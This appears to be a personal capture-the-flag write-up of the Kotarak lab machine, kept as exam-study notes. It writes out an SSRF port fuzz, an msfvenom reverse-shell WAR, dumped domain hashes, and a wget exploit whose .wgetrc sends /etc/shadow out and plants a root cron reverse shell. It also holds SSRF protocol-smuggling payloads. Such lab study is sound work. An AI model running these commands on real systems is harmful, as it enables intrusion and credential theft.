# Kotarak Helped-Through

Name: Kotarak
Date:  2/2/2023
Difficulty:  Hard
Goals:  
- OSCP Prep
- Female Neurodiversity for the assimilation
Learnt:
- Scrapping the brain pellets together to make the connection that with internal 127.0.0.1 we can fuzz  for ports for SSRF - never done that
- Weaknesses and the way
	- Piecing together the pieces more effectively:
	- Fumbling objectives because I am not uses the upcoming - Notes and CMD-by-CMD only
	- Reading details - or bad intuitive assumptions of remote hosting the exploit, because alots of exploits are run remotely that are like this as I have never had install pip packages - but I did not check for pyftpdlib
	- `self.wfile.write(ROOT_CRON)`  has to have the permission to write the cron
	- Double checking before running
- engrampa to read zips without openning 
Beyond Root:
- Linux Malware in C/Rust and detections for Rootkits and Malware
- Best FTP server

<iframe width="560" height="315" src="https://www.youtube.com/embed/yOxk3JghqCk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

[areyou0or1](https://www.youtube.com/watch?v=yOxk3JghqCk) is OSCP, OSCE, SLAE64, OSWP, CCP. OSEE and the Senior Vulnerable Machine Engineer at Offsec. She is awesome in probably every possible way. If I find anymore female youtubers like this I would be a lucky fool.

She is a biological female - so neurodiversity for the assimilation! 
Her videos are less than 20 minutes long - meaning:
- Only relevant no fluff information - no memes, just chill, pure straight forward for the jugular.
- I have to pause a figure out how should I answer this part and or why did she think that? - Building on your own patterns of thought.  

I was going to keep it to this, but I [Ippsec](https://www.youtube.com/watch?v=38e-sxPWiuY) has unintentional methods I want to try also:
<iframe width="560" height="315" src="https://www.youtube.com/embed/38e-sxPWiuY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

Ippsec in his introductory statement directs viewers to [Orange Tsai - orangetw](https://github.com/orangetw) and very has a a convenient backdoor named [tsh](https://github.com/orangetw/tsh) , but more importantly for the inital attack vector talks on complex SSRF attack that lead to code execution. I decided to watch [DEF CON 25 - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languagues](https://www.youtube.com/watch?v=VlNA0BPpQpM). See Beyond Root Section!


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Kotarak/Screenshots/ping.png)

- Webserver default Admin Login panels?
	- Default passwords?

10.129.1.117:8080/manager/html - Admin login portal
![](htmllogin.png)

- Strange/Custom ports?
	- What do common extractions with CLI tools suggest about this ports use? -  `curl`, `telnet`, `nc`


![](urlparam.png)

Ippsec approach mixed with mine 
```bash
python3 -m http.server 8888
curl -X GET 'http://10.129.1.117:60000/url.php?path=http://10.10.14.29:8888/hellothere'
```

![1080](widescreenpocssrf.png)

Local File inclusion with `file://`
```bash
curl -X GET 'http://10.129.1.117:60000/url.php?path=file:///etc/passwd'
# Check no where it errors out
curl -X GET 'http://10.129.1.117:60000/url.php?path=file'
curl -X GET 'http://10.129.1.117:60000/url.php?path=fil'
```
Ippsec and I are told to try harder.
![](tryharderippsec.png)

A brief segway as learning the power of phpfilters was like:
<iframe width="560" height="315" src="https://www.youtube.com/embed/R2Iih-Ch57w" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
[Unfortunately I am not even close to this even among other humans...](https://www.youtube.com/watch?v=NPGUIpv-JxI) from my notes it discusses `include` and the design of the site probably is not looking to `include` the internet. 

Parameter equals:
![](fieldtotheparam.png)

- What data returns from the testing the parameter
	- LFI? Can you read disk/memory?
	- RFI? Can you get remote resources? - Internal && External
	- SSRF? Can you request known resources - ports, files, webpages?
	- XSS? Can you execute javascript scripting?
	- SSTI? Can you exploit the template engines access to system?
	- (no)SQLI? Can you create error code enough to PoC interaction with database?  
	- CMDi? Can you execute with `& CMD` - windows  or `; CMD` - linux?
	- IDOR? Can you deserialize or decoded data; or modify data to change your object context?  

She did not mention, but I `curl`-ed the info.php for data intelligence reasons. Although if found this it would be better to just copy and paste from browser for a bit more stealth
![1080](usefulinfodotphp.png)


## Exploit

This machine is vulnerable to SSRF, we are access resource that are avaliable to the box on its localhost - as we are access from our attack machine at its 0.0.0.0 address. We are ask the Server-Side to Request something that we should not have access to too. 

areyou0or1's next move is to fuzz the parametre
```bash
wfuzz -c -z range,1-65535 http://10.129.1.117:60000/url.php?path=http://127.0.0.1:FUZZ
# I am more a 0-65535 and ffuf guy; so I just created a wordlist:
for i in {0..65535}; do echo "$i"; done > allPortNumbers.txt
# fuzz away, testing for false falsities and adjusting filtering out by response size of two
# This file will contain 4444 because I had to redo this for 
ffuf -u http://10.129.1.117:60000/url.php?path=http://127.0.0.1:FUZZ -fs 2 -w allPortNumbers.txt -o ffuf-allports.md -of md
```

Going through the ports...
![1080](ssrfport90.png)
Double checked the output for a non found port:
![](justssrftheff.png)

Books on the POP3 
![](booksonthepop3.png)

Hello world...
![](helloworld200.png)

Oooooohh yeahh
![](supersensitiveadmin320.png)

Files to exfiltrate
![1080](filetoexfil.png)

Port 3306 is a mysql server and port 8080 is Apache Tomcat/8.5.5
![](notomcaton8080.png)

An SSRF private browser...
![1080](anonbrowserforfree.png)

Back to the exfil, I check the source of the parametre to get all the files
![](inthesource.png)

Unfortunately no tetris header file...but the backup has hardcoded credentials
```html
<user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>
```

![](weareadminintomcat.png)

Mitigations for this:
- No allowing 127.0.0.1 to be requested with a filtering
```php
if (strpos($url, "127.0.0.1") !== false) {
  echo "No localhost for you";
}
```


## Foothold

After gettting side tracked as to what the word kalisa means...
```bash
msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.14.58 lport=8888 -f war -o kalisa.war
# Busra gives the awesome trick of unzipping the war file to get the actual shell file zip up
# I am facepalming almopst 100 machines prior at this point
unzip kalisa.war
```

![](bursaisawesome.png)

For the final run with Ippsec
```bash
# engrampa to note the .jsp file for calling the reserver shell with minimal filesystem
engrampa kalisa.war # vegezcdnllksu.jsp
engrampa asilak.war # qbfwxhqoqgtfbd.jsp
```

Start playing [Primus's Tommy the cat](https://www.youtube.com/watch?v=r4OhIU-PmB8) 
![](wearetomcat.png)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=screen-256color 
# Ctrl Z
# Check rows and cols
stty -a
stty -raw echo;fg
```


There is pentest data to be exfiltrated!
![](pentestintomcathomedirectory.png)

```bash
# host another webserver on the kotarak
python3 -m http.server 4444
# recursively download everything
wget -r http://10.129.1.117:4444/
```

I was immediate asking why psexec... .dir files are active directory

```python
impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274
Administrator:des-cbc-md5:75375eda54757c2f
WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5
WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd
krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
krbtgt:des-cbc-md5:10ef08047a862046
krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee
WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908
WIN2K8$:des-cbc-md5:d352a8d3a7a7380b
WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487
WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded
WINXP1$:des-cbc-md5:984a40d5f4a815f2
WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279
WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01
WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772
WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
WIN7$:des-cbc-md5:89a1673723ad9180
WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c
atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
atanas:des-cbc-md5:6b80e391f113542a
[*] Cleaning up...
```

And we have the hashes of the other user on the box atanas

`Administrator : f16tomcat! `     

## PrivEsc

![](wearenowatanas.png)

Just why?
![](why.png)

First thing was check if root can ssh in
![](yesbutno.png)

Interestingly I paused the video as I wanted to atleast fail for a good thirty minutes on this very intersting machine.
![](archivestowget.png)

- There is nmap on the box - but we have troll, so no nmap cli
![](trollmap.png)

- All the other ports - the password does not work for other login page
- We have dns on 53, 8005 and tcp6 address that is in ipv4 for some reason...
![](otherportsreturn.png)
No mysql login
![](mysqlnologin.png)

- /backups is the tomcat-user.xml
- vmlinuz(.old) - boot script
- /.config - no accessible
- Amanda is a network backup
![1080](ssh.png)
- atanas can make disks
- we have alot of socket control
- root is using lxd - but we are not in the lxd group `lxc image list` - denied
![1080](lxdroot.png)
- atanas's path is misconfigured 
![1080](misconfigPATH.png)

As the beyond root I will try and understand any of these that work:
- [CVE-2017-16995](https://www.exploit-db.com/download/45010) eBPF_verifier - Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html - Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
- [CVE-2016-5195](https://www.exploit-db.com/download/40611) dirtycow -   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
- [CVE-2016-5195](https://www.exploit-db.com/download/40839) dirtycow 2 -   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
- CVE-2021-4034 PwnKit - Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
- Vulnerable to CVE-2021-4034

Eliminating option Amanda Network backup and the socket control and the disk creation to me add up to some kind of backup of the entire disk we can then read? Which seem crazy loud and data intensive.

- At some point become root in the exploit chain and use lxc and lxd 

But we are not of lxc group
client.crt
```
MIIGEzCCA/ugAwIBAgIRAPRnFVp39NGuLY1e876y++YwDQYJKoZIhvcNAQELBQAw
OzEcMBoGA1UEChMTbGludXhjb250YWluZXJzLm9yZzEbMBkGA1UEAwwSYXRhbmFz
QGtvdGFyYWstZG16MB4XDTIzMDIwMjE5MTgzNloXDTMzMDEzMDE5MTgzNlowOzEc
MBoGA1UEChMTbGludXhjb250YWluZXJzLm9yZzEbMBkGA1UEAwwSYXRhbmFzQGtv
dGFyYWstZG16MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAz9AMDVOM
MI5dpjOIN6PN3AK4j7SuGD8yVge172xTT+6awjeS+c+DPEpSw74EngHkmIFgzVol
QI3Ruukj+UWSUUUgwK7KAke2GLsr7xNqoXYUl5SxKc1hDJDEvpOG4aFq8zEK0FQi
bbqhHKChl7RcgHwGq3XtosfHJq3QPhNJamuLp91F7H93uGsMe6Xbh7zGvCZMURtZ
SlFlEPqm/O4aRkCYye1xLwzqXeWxhmqcQ0mr355DsVG9fuUB/oEcd/vE1nisQ1py
Ev7wqtc5SDBOayPoAHs/zuYKWmkKWB23tbWPCQnXRqOQuzwgqwNrgANNGI7Y1hEF
U3LS3i8w2r8Y9kl3ZnaFlNRQSDmf0W3jBP4pCYRUSBEVCPhbYBtqGC4L+kI6MgEb
WDpV+s8vn6RFwKRzK42NqDusVU+uo+uroNHakitsG72DV3aEt7YrySRYKJLFhHA0
2Xn+JK6qebXirsZZf/gam8Xt3mQpfkFpEOqbLBSPXMyWJ7P+sPqD+ZQss0D7R+cg
DZoZpIBmYFPeH/cJXpctdjo+RGGVxbTm2M7eM/Wy12RhUf052MCJHgVMJAbLvaVD
yOOC80gI0ecq8ahNwq8hyZiS4YgNvkhS12P9sftjvuOJzMOmNhQFI3Jve33ouVUr
1PqJ9ajMZQWw8w3E0fi+ysVrMSwhwcZijMcCAwEAAaOCARAwggEMMA4GA1UdDwEB
/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNVHRMBAf8EAjAAMIHWBgNV
HREEgc4wgcuCC2tvdGFyYWstZG16gg8xMC4xMjkuMS4xMTcvMTaCIGRlYWQ6YmVl
Zjo6MjUwOjU2ZmY6ZmU5NjpjOTE5LzY0ghtmZTgwOjoyNTA6NTZmZjpmZTk2OmM5
MTkvNjSCG2ZlODA6OjQwYjo3NmZmOmZlOTg6YmI2ZS82NIIKZmU4MDo6MS82NIIL
MTAuMC4zLjEvMjSCGGZlODA6OjIxNjozZWZmOmZlMDA6MC82NIIcZmU4MDo6ZmM1
ZDo2MmZmOmZlMGE6ZDA0Yy82NDANBgkqhkiG9w0BAQsFAAOCAgEAozYr7jFigdC5
urswtyxeLRXnqrWKhT82onVE3KAMI8bMl4SCz1mzU0NySa/+XsmjKAnoZeaHvYzy
HleDSwIx5pAI12tp7HWCVX2e9RTmHG0WUoVaNIWlReeJRJ5teTXCmtpw3Tp6YFi5
bB6Gb7Zu3I6vkrpw/s3VnP84ZTHwRWJbIlxfciOh40gXEStCNdQcjaFDfAwYWjSd
XUQAWYJAH1aLJDOvIhpd5VxABFnAp1A5uQ7jPJ/whx+IPoyJyBotu8Hl5pxgvihS
uWwZVqa0erdjevW3ocdxELamNw2xhq5NCVnG0gVAv3FrU8uxVBg70UaQCNvXBz3c
z9Q4g9WTdDutzFTsFW67EP+7bIIdDEliA8hwfGgLy+GXy4TXNNFpARCpNPayVkLm
86xKk0jLeD8QDBTp0QktcjQ79BACcWBErwNydlybEU4RWc/qeC7GKCS/e/guokAE
9K/FjLdF+4j8hexuxhuT8+evG0w8JqNfpc+XbbNTllYNLHKglo6XYcuDv8iw0269
N60fZVdGAu5j63n9jOqeSpnOwmI55F3F6iX7yNb47tard1EtqUsImRP/FVup4Zh3
ebE/CJtaABiUj2TqUPYCLhmQYSzm5Iorc5bcmLL3XiqltalL961bSlZCaxqOyU2h
0PyyaDxybskPh3j+b+UlsIQ+k1MEhbs=
```

45 minutes on I think this is a tad beyond me. I continue the video. I missed two things in all of this - the dns 53 and the app.log pieces!

Ok OSCP - always check the versions  and BEWARE of PrivEsc rabbit holes - it is exploitable for a reason, ever piece is a hint:
[potential RCE](https://www.exploit-db.com/exploits/40064) - I pause to read and try without help.
```txt
GNU Wget before 1.18 when supplied with a malicious URL (to a malicious or 
compromised web server) can be tricked lxcinto saving an arbitrary remote file 
supplied by an attacker, with arbitrary contents and filename under 
the current directory and possibly other directories by writing to .wgetrc.
... 
 not work if extra options that force destination
filename are specified as a paramter. -r and -m may work

```

root cronjob - By default cronjobs run within home directory of the cronjob owner. 

```bash
*/2 * * * * root wget -N http://attackers-server/database.db > /dev/null 2>&1
```


```txt
- upload .bash_profile file - write out .wgetrc file in the 
first response and then write to /etc/cron.d/malicious-cron in the second. 
```

1. Create a malicious .wgetrc
2. Start FTP server
```bash
attackers-server# mkdir /tmp/ftptest
attackers-server# cd /tmp/ftptest

attackers-server# cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_
# Or another ftp method
# Legacy:
# attackers-server# sudo pip install pyftpdlib
attackers-server# sudo apt install python3-pyftpdlib
attackers-server# python3 -m pyftpdlib -p21 -w
```

- Python2 exploit..
```bash 
# for complete research and reading sake 
searchsploit -m linux/remote/49815.py
searchsploit -m linux/remote/40064.txt
# Made a 40064.py
```


TL;DR - For The FeynmanWin

As a server requested by a victim with the CVE-2016-4971 vulnerable version of wget, we can force the victim to arbituary file creation and write. It is not a RCE in the strictiest sense, but in the context of this machine we can:
1. Make victim download a malicious .wgetrc 
	- this allow us to define wget settings and therefore expanding the capability of subsequent uses of wget for our attack chain
1. On the second download create a malicious cron job, which wil be written and run as root

[40064](https://www.exploit-db.com/exploits/40064) and [49815](https://www.exploit-db.com/exploits/49815)
[wgetrc commands documentation](https://www.gnu.org/software/wget/manual/wget.html#Wgetrc-Commands)


I initial tried with the original exploit but it errored out on the server so I tried the other and both failed. My mistake was reading and fixation. Coming back I understood what I was doing wrong:

- Where are we sending the cron? = 10.0.3.133
![](checkingtomakesureIdosomethingbad.png)

Port scanning with bash
```bash
for port in $(seq 1 65535); do (echo Hello > /dev/tcp/10.0.3.133/$port && echo "open - $port") 2> /dev/null; done
```

Resulted in: 
![](itisopenon22.png)

Changes to the 40064.py
```python
# Changes
HTTP_LISTEN_IP = '10.10.14.29'
HTTP_LISTEN_PORT = 10000
FTP_HOST = '10.10.14.29'
FTP_PORT = 21

ROOT_CRON = "* * * * * root bash -c \'bash -i >& /dev/tcp/$ip/$port 0>&1\'\n"
```

Kotarak:
```bash
curl http://10.10.14.29/40064.py -o /tmp/40064.py
python2 40064.py
```

```bash
rlwrap ncat -lvnp 10003
python3 -m pyftpdlib -p21 -w
```

Clear the clipboard
```bash
echo -n | xsel -b
echo -n | xclip -in
```

It resulted just recieving index.html in /root and no cron, I fixed the escaping the quotes in the cronjob 
![](removeswgetrc.png)
But is not removing it. The script does not seem to write the cron either. servee_forever is [real](https://docs.python.org/2.7/library/socketserver.html). Tried putting the wgetrc in atanas's home directory
![](wgetrcinatanashome.png)

I watched the video and Ippsec runs it from the box.. also it takes awhile. 

```python
# Changes
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.129.200.66'
FTP_PORT = 21

ROOT_CRON = "* * * * * root bash -c \'bash -i >& /dev/tcp/$ip/$port 0>&1\'\n"
```

I realised that I had problems with this machine months ago and remembered being stuck with understand and read 0xdf writeup. 
![](piecebypiece.png)
![](multiattempts.png)

And with root, I must address the piecing together pieces for the final part of this machine failed multiple times on multiple aspects of each attempt.
![](root.png)

Firstly my excuse: 
- In March I attempted this box and ended up with a bootkit and probably still do. 
	- It starts as a rootkit
	- I tested it and found my machine make calls out during no power
- I saved the on usb that I stashed to forensically analyze on day along with everything else because of compromised here [[Kotarak-Recovery]]

### I am hacked

Even though this does not bother my it seems pretty good at what it does and got me interesting in that technology. It is absolutely human operated and I had heard from Nahamsec podcast of a guest that would never use HTB because it scared him. 

I have nothing of value other than the motherboard and other hardware it would have concatinated as if you going to drop bootkits and them work well. I consider all hardware that had any power running through it as forfeit till have a job that pays the kind of money to afford more hardware.

I would feel bad selling it to someone, but it could have anti-forensic capabilities and brink the board even if I was persistent enough or good enough to get a good job to just spend money on all my hardware again. 

I have to reveal it somewhere public for legal reasons encase I get used or I am being used for whatever reason.

Continued Migitations being:
- Download a fresh VPN key each time you use HTB...
- VMs wont save you, if you having a bootkit and rootkit dropped - no hardware is safe unless is has no power running through it
- No personal projects you would not want whomever the bootkit belongs to anywhere near - no change there
- No cross contamination
- Only use this PC as I was using it for anyway
	- Faraday Cage for PC and al-possible-types-of-gaps-network-seperated-internet 
	- Quantine all touching and accessible with power hardware 
		- If I could afford a new PC I could afford a forensics lab
			- If possible copy all firmware without **current or PSU** and reimage with fresh firmware
- I do not think anyone would take me seriously so if had enough status I would, but I will warn people about. 

```
Dont use your production PC to connect to HTB Network  
We strongly recommend not to use your production PC to connect to the >HTB Network. Build a VM or physical system just for this purpose. HTB >Network is filled with security enthusiasts that have the skills and toolsets >to hack systems and no matter how hard we try to secure you, we are likely >to fail ![:stuck_out_tongue:](https://emoji.discourse-cdn.com/twitter/stuck_out_tongue.png?v=12 ":stuck_out_tongue:") We do not hold any responsibility for any damage, theft or loss of >personal data although in such event, we will cooperate fully with the >authorities.
```

## Lessons regardless of re-reading 

Anyway enough excuse making - more explaining the weird continuity - especially as the coherence of [[Kotarak-Recovery]] does not demonstrate understand of the exploit.

Areas of weakness:
- Piecing together the pieces more effectively:
	- cronjob
	- authbind for second time for both ftp and http server
	- exploit has to be run from the target machine, because of the cronjob
	- pyftpdlib is on the box
	- .wgetrc need to belong to root! 
	- we are not in the lxc group 
	- kotarak-dmz `/proc/net/arp` shows contact with kotarak-int 
- Fumbling objectives because I am not uses the upcoming - Notes and CMD-by-CMD only
- Reading details - or bad intuitive assumptions of remote hosting the exploit, because alots of exploits are run remotely that are like this as I have never had install pip packages - but I did not check for pyftpdlib
	- `self.wfile.write(ROOT_CRON)`  has to have the permission to write the cron
- Double checking before running

Over the upcoming weeks to fix had plans to do 14 machines with no-writeup assistance
- Notes and CMD-by-CMD only - use creenshot_and_report_format_loader.sh
- Marshall data better and make it visibile
	- "PrivEsc/FootHold - pieces" 
		-  ie cronjob, wget vulnerable, authbind and pyftpdlib is on the box
	 - Requirements lists for exploitation chains
	 - Add comments to the modified exploit code so that I understand and have question what it is doing in the context of the box.
- Read exploit twice and once after changes
kotarak
I will return in two weeks for [Ippsec unintended way](https://www.youtube.com/watch?v=38e-sxPWiuY) and the beyond roots

## Beyond Root

#### While eating and watching xct

Watch [xct](https://www.youtube.com/watch?v=w2K-bQNs3cg) speed through Bankrobber on HTB and having recently finished the 13 Day [[Reddish-Helped-Through]] of absolute incredible learning and growth; xct waps out pwntools to create an interactive shell to interact with [ssf](https://github.com/securesocketfunneling/ssf) a c++ tunneling application with tls.  Although I have seen this awhile ago it struck me as something to quickly revise and copy. More ways to interact and try understand python. pwntools has become my favourite python library also one where the documentation is not written by the same team that write and format the washing machine manual terms and condition sections.

```python
from pwn import *

context.proxy = (sock.SOCK4, localhost, 9090)
# Functional code can start here
p = remote('localhost', 910, level='info')
# Functional code does here
# Then end with p.interactive() 
p.interactive()
```


#### Monolith continuation - aka  Rogue Server Stack of Doom

[[Kotarak-Server-Plan]]

https://www.youtube.com/playlist?list=PL9IEJIKnBJjFNNfpY6fHjVzAwtgRYjhPw
https://www.youtube.com/playlist?list=PL9IEJIKnBJjH_zM5LnovnoaKlXML5qh17

[Jacob Sorber Programming with Processes](https://www.youtube.com/playlist?list=PL9IEJIKnBJjFNNfpY6fHjVzAwtgRYjhPw), I watched the Sending and Handling Signals in C video

```c 

sigaction
```

####  tsf 

https://github.com/orangetw/tsh

#### Orange Tsai Talk

I decided to watch [DEF CON 25 - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languagues](https://www.youtube.com/watch?v=VlNA0BPpQpM). See Beyond Root!
- Protocol Smugging in SSRF
	- HTTP based: Elastic, CounchDB, Mongodb, Docker,
	- Text based: FTP, SMTP, Redis, [Memcached](https://en.wikipedia.org/wiki/Memcached) 

Python treats the std library differently
```python
# Python is hard
http://1.1.1.1[]&@2.2.2.2#[]@3.3.3.3
# 1.1.1.1 - urlliub2 httplib
# 2.2.2.2 - requests
# 3.3.3.3 - urllib
```

CR-LF injection on HTTP protocol; Smuggling SMTP protocol over HTTP protocol - Server will close connection
```
GET /
http://127.0.0.1:25%0%D%0AHELO oragne.tw%D%0AMAIL FROM...
>> HELO orange.tw
Connection closed
```

We focus on HTTP and HTTP(s) to smuggle as protocols then ask: What wont be encrypted in a SSL handshake? - over TLS SNI. Using a `\n` replacing `/`  between the domain name and port in previous exmaple to break up the message:
```
GET /
http://127.0.0.1 %0%D%0AHELO oragne.tw%D%0AMAIL FROM...
>> HELO orange.tw
<< 250 ubuntu Hello Localhost [127.0.0.1], please to meet you
>> MAIL FROM: <admin@orange.tw>
<< 250 2.1.0 <admin@orange.tw>... Sender ok
```

11:11